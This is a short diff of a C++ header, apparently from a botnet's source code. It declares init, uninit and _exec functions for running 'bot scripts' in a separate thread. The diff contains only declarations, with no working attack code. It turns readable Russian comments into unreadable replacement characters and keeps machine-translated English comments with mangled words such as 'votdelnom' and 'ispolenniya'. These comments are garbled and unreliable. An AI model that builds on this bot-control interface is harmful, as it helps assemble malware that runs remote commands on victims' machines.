@@ -1,5 +1,5 @@
 /*
-  Исполнение скриптов бота.
+  ���������� �������� ����.
 */
 #pragma once
 
@@ -8,23 +8,23 @@
 namespace RemoteScript
 {
   /*
-    Инициализация.
+    �������������.
   */
   void init(void);
 
   /*
-    Деинициализация.
+    ���������������.
   */
   void uninit(void);
 
-  /*В В В В Run the script execution votdelnom flow. Flow should not be run from
-В В В В Process:: INTEGRITY_LOW processes.
+  /*    Run the script execution votdelnom flow. Flow should not be run from
+    Process:: INTEGRITY_LOW processes.
 
-В В В В IN script - a script for execution.
-В В В В 
-В В В В Return - true - in the cases of the successful launch ispolenniya script (script will be released
-В В В В В В В В В В В В В В В В automatically)
-В В В В В В В В В В В В В В В В false - if an error (script to release its own).
-В В */
+    IN script - a script for execution.
+    
+    Return - true - in the cases of the successful launch ispolenniya script (script will be released
+                automatically)
+                false - if an error (script to release its own).
+  */
   bool _exec(BinStorage::STORAGE *script);
 };
